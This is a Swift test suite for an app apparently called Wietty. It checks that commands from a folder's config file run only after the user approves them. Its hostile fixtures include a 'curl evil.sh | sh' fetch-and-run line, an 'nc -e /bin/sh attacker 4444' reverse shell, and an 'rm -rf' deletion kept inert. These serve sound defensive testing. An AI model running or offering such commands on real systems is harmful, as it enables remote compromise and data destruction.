import Testing
import Foundation
@testable import Wietty

/// Adding a folder used to be enough to run whatever its `wietty.json` said: the
/// reconcile applies process definitions, and the supervisor starts anything with
/// `auto_start` on the spot. These pin the question being asked first.
@MainActor @Suite struct ConfigApprovalStoreTests {
    private func makeDefaults() -> UserDefaults {
        UserDefaults(suiteName: "test.\(UUID().uuidString)")!
    }

    private func folder(withConfig config: WorkspaceConfig) -> URL {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try! FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        _ = try! ConfigFile.write(config, in: url)
        return url
    }

    /// The command the hostile fixture carries. It has to read as something nobody
    /// would want run without being asked, because that is what these tests are
    /// about, but it must stay inert: `approvePendingConfig` applies the file, and
    /// applying a definition with `auto_start` is a launch. A fixture pointed at a
    /// real path would be run for real by any store built without a fake launcher.
    private static let destructiveCommand = "rm -rf /tmp/wietty-nonexistent-approval-fixture"

    private func hostileConfig() -> WorkspaceConfig {
        WorkspaceConfig(
            name: nil,
            agents: [.init(slot: "a", type: "curl evil.sh | sh")],
            terminals: [],
            processes: ["boot": ProcessConfig(command: Self.destructiveCommand, autoStart: true)]
        )
    }

    /// Every store here is driven past the approval gate on purpose, so every store
    /// here needs a launcher that cannot spawn. The default `ProcessSupervisor` and
    /// `TestSupervisor` both carry a real `PTYProcessLauncher`, and `FakeTerminalService`
    /// covers terminal sessions only, so it is no protection against a process launch.
    private func store(_ defaults: UserDefaults,
                       service: TerminalService = FakeTerminalService()) -> ProjectStore {
        ProjectStore(
            defaults: defaults,
            service: service,
            gitProvider: FakeGitInfoProvider(),
            processSupervisor: ProcessSupervisor(launcher: FakeProcessLauncher()),
            testSupervisor: TestSupervisor(launcher: FakeProcessLauncher())
        )
    }

    /// The whole point: nothing from the file reaches the store until it is agreed
    /// to. Not the rows, whose entire content is the line they type, and not the
    /// process definitions, which include one that starts without a click.
    @Test func addingAFolderWithAnUnapprovedFileAppliesNothing() {
        let store = store(makeDefaults())
        store.addProject(url: folder(withConfig: hostileConfig()))

        #expect(store.projects[0].terminals.isEmpty)
        #expect(store.projects[0].configProcesses == nil)
        #expect(store.pendingConfigApproval?.commands.sorted()
                == ["curl evil.sh | sh", Self.destructiveCommand].sorted())
    }

    @Test func approvingAppliesTheFile() {
        let store = store(makeDefaults())
        store.addProject(url: folder(withConfig: hostileConfig()))
        store.approvePendingConfig()

        #expect(store.pendingConfigApproval == nil)
        #expect(store.projects[0].terminals.map(\.slot) == ["a"])
        #expect(store.projects[0].configProcesses?["boot"]?.command == Self.destructiveCommand)
    }

    /// Declining leaves the workspace in the sidebar and the file unapplied, rather
    /// than hiding the folder or remembering a "no" that can never be revisited.
    @Test func decliningAppliesNothingAndRecordsNothing() {
        let store = store(makeDefaults())
        store.addProject(url: folder(withConfig: hostileConfig()))
        store.declinePendingConfig()

        #expect(store.pendingConfigApproval == nil)
        #expect(store.projects.count == 1)
        #expect(store.projects[0].terminals.isEmpty)
        #expect(store.approvedCommands.isEmpty)
    }

    /// And the question comes back, because a decline is not a decision about the
    /// folder for good.
    @Test func aDeclinedFileIsAskedAboutAgain() {
        let store = store(makeDefaults())
        store.addProject(url: folder(withConfig: hostileConfig()))
        store.declinePendingConfig()

        store.applyConfigChanges(for: store.projects[0])
        #expect(store.pendingConfigApproval != nil)
    }

    /// Agreeing once is agreeing. A prompt on every launch is a prompt people learn
    /// to dismiss without reading, which is worse than not asking.
    @Test func anApprovedFileIsNotAskedAboutAfterARelaunch() {
        let defaults = makeDefaults()
        let first = store(defaults)
        first.addProject(url: folder(withConfig: hostileConfig()))
        first.approvePendingConfig()

        let second = store(defaults)
        #expect(second.pendingConfigApproval == nil)
        #expect(second.projects[0].terminals.map(\.slot) == ["a"])
    }

    /// A line added to an approved file is new, so it is asked about even though the
    /// folder has been agreed to before. Otherwise a synced file could grow a command
    /// after the one approval it ever needed.
    @Test func aLineAddedLaterIsAskedAboutOnItsOwn() throws {
        let defaults = makeDefaults()
        let store = store(defaults)
        let url = folder(withConfig: hostileConfig())
        store.addProject(url: url)
        store.approvePendingConfig()

        var grown = hostileConfig()
        grown.processes?["later"] = ProcessConfig(command: "nc -e /bin/sh attacker 4444")
        _ = try ConfigFile.write(grown, in: url)
        store.applyConfigChanges(for: store.projects[0])

        #expect(store.pendingConfigApproval?.commands == ["nc -e /bin/sh attacker 4444"])
    }

    /// A file the user's own workspace just wrote is made of what they already asked
    /// for, so turning sync on does not immediately ask about their own rows.
    @Test func turningSyncOnDoesNotAskAboutTheUsersOwnRows() async {
        let fake = FakeTerminalService()
        fake.handles = [TerminalHandle(sessionId: "s1", windowId: "w1")]
        let store = store(makeDefaults(), service: fake)
        let url = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try! FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        store.addProject(url: url)
        await store.openAgent(AgentDefinition(name: "Codex", command: "codex --model o3"),
                              for: store.projects[0])

        store.enableConfigSync(for: store.projects[0])
        store.applyConfigChanges(for: store.projects[0])

        #expect(store.pendingConfigApproval == nil)
    }

    /// A file that only lays rows out, with no line of its own anywhere, runs nothing
    /// this app did not already run. Asking there would train people to say yes.
    @Test func aFileThatRunsNothingNewIsNotAskedAbout() {
        let plain = WorkspaceConfig(
            name: nil,
            agents: [.init(slot: "a", type: ConfigReconcile.defaultAgentType)],
            terminals: ["Terminal 1"]
        )
        let store = store(makeDefaults())
        store.addProject(url: folder(withConfig: plain))

        #expect(store.pendingConfigApproval == nil)
        #expect(store.projects[0].terminals.map(\.slot) == ["a", "Terminal 1"])
    }
}
